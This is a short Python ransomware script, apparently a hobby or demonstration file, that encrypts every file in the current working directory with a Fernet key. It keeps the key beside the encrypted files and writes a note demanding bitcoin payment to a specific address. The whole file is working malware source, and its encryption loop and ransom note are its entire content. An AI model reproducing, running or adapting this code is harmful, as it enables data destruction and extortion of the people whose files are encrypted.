import os
from cryptography.fernet import Fernet

files=[]


'''
if you want to add custom path or list directories other than your working directory
import os
from cryptography import fernet

files=[]

for file in os.listdir():
    if file== "ransomewareEncoding.py":
        continue
    if os.path.isdir(file):
        continue
    files.append(file)
print(files)'''

for file in os.listdir():
    if file== "ransomewareEncoding.py"  or file=="ransomewareDecrypting.py" or file=="encryption.key" or file=="READ_THIS.txt" or file==".git":
        continue
    if os.path.isdir(file):
        continue
    files.append(file)

enckey="encryption.key"

note="All your files are encrypted if you dont want to loose your data then pay $100 million in bitcoins to this address \nBitcoin address: 17hAnwKbzRKQURS52Pz4bnVXPLLenLgRnu"
with open ("READ_THIS.txt", 'w') as ransomNote:
    ransomNote.write(note)

if os.path.exists(enckey):
        with open(enckey, "rb") as f:
            key = f.read()
else:        
    key=Fernet.generate_key()
    with open("encryption.key", "wb") as encryptionkey:
        encryptionkey.write(key)

for file in files:
    with open (file, "rb") as thefile:
        contents=thefile.read()
    contents_encrypted=Fernet(key).encrypt(contents)
    with open (file, "wb") as thefile:
        thefile.write(contents_encrypted)